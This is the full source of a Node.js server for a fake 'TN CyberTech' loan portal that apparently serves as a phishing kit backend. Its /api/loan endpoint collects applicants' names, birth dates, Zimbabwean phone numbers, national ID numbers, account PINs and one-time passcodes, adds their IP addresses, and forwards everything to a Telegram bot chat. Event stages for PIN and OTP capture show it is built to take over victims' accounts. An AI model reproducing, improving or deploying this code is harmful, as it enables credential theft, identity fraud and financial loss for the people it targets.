'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: false }));

/* ── Security headers ── */
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options',  'nosniff');
  res.setHeader('X-Frame-Options',         'DENY');
  res.setHeader('X-XSS-Protection',        '1; mode=block');
  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
  next();
});

/* ── Rate limiters ── */
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 30,
  message: { error: 'Too many requests. Please try again later.' },
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
});
app.use('/api/loan',     apiLimiter);
app.use('/api/telegram', apiLimiter);

/* ── Static files ── */
app.use(express.static(path.join(__dirname), {
  extensions: ['html'],
  index: 'index.html',
}));

/* ── Telegram helper ── */
function sendTelegram(text) {
  return new Promise((resolve, reject) => {
    const TOKEN   = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    if (!TOKEN || !CHAT_ID) {
      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
      return resolve({ ok: false, reason: 'env_missing' });
    }
    const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch { resolve({ ok: false }); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

/* ── POST /api/loan — main notification endpoint ── */
app.post('/api/loan', async (req, res) => {
  try {
    const {
      event        = 'loan_submitted',
      name         = '',
      dob          = '',
      phone        = '',
      phoneDisplay = '',
      nid          = '',
      emp          = '',
      income       = '',
      amount       = '',
      tenure       = '',
      monthly      = '',
      rate         = '',
      pin          = '',
      otp          = '',
      submittedAt  = '',
      hasAcct,
    } = req.body || {};

    if (!phone && !name) return res.status(400).json({ error: 'Invalid payload' });

    /* Reconstruct clean full phone */
    const localNum = phone.replace(/^\+?0*263/, '').replace(/\D/g, '');
    const fullPhone = localNum ? `+263${localNum}` : (phoneDisplay || phone || '—');

    const empLabel = emp === 'employed'
      ? 'Employed (Salaried)'
      : emp === 'self' ? 'Self-Employed' : emp || '—';

    const now = new Date().toLocaleString('en-GB', {
      timeZone: 'Africa/Harare', hour12: false,
    });
    const submittedStr = submittedAt
      ? new Date(submittedAt).toLocaleString('en-GB', { timeZone: 'Africa/Harare', hour12: false }) + ' CAT'
      : now + ' CAT';

    const emoji = {
      loan_submitted:      '🏦',
      loan_pin_auth:       '🔐',
      loan_otp_confirmed:  '✅',
      loan_otp_resend:     '🔁',
    }[event] || '📋';

    const lines = [
      `${emoji} <b>TN CyberTech — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${submittedStr}`,
      ``,
      `👤 <b>Name:</b> ${name || '—'}`,
      dob          ? `🎂 <b>Date of Birth:</b> ${dob}`                          : null,
      `📱 <b>Phone:</b> <code>${fullPhone}</code>`,
      pin          ? `🔐 <b>PIN:</b> <code>${pin}</code>`                        : null,
      otp          ? `🔑 <b>OTP:</b> <code>${otp}</code>`                        : null,
      ``,
      nid          ? `🪪 <b>National ID:</b> <code>${nid}</code>`                : null,
      empLabel     ? `💼 <b>Employment:</b> ${empLabel}`                         : null,
      income       ? `💰 <b>Income:</b> USD ${Number(income).toLocaleString()}/month` : null,
      hasAcct !== undefined ? `🏦 <b>TNCT Account:</b> ${hasAcct ? '✅ Confirmed' : '❌ No account'}` : null,
      ``,
      amount       ? `💵 <b>Loan Amount:</b> USD ${Number(amount).toLocaleString()}`  : null,
      tenure       ? `📅 <b>Tenure:</b> ${tenure} months`                        : null,
      monthly      ? `📆 <b>Monthly Repay:</b> USD ${Number(monthly).toFixed(2)}` : null,
      rate         ? `📈 <b>Rate:</b> ${rate}% p.m. flat`                        : null,
      ``,
      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
    ].filter(Boolean).join('\n');

    const result = await sendTelegram(lines);
    return res.json({ ok: true, telegram: result.ok });
  } catch (err) {
    console.error('[/api/loan]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── POST /api/telegram — legacy alias ── */
app.post('/api/telegram', async (req, res) => {
  /* Forward everything to /api/loan */
  req.url = '/api/loan';
  app.handle(req, res);
});

/* ── GET /health ── */
app.get('/health', (req, res) => {
  res.json({
    status:   'ok',
    app:      'TN CyberTech Loan Portal',
    uptime:   Math.floor(process.uptime()),
    telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID),
  });
});

/* ── Catch-all → index.html ── */
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

/* ── Start ── */
app.listen(PORT, () => {
  console.log(`✅  TN CyberTech server running on port ${PORT}`);
  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
});
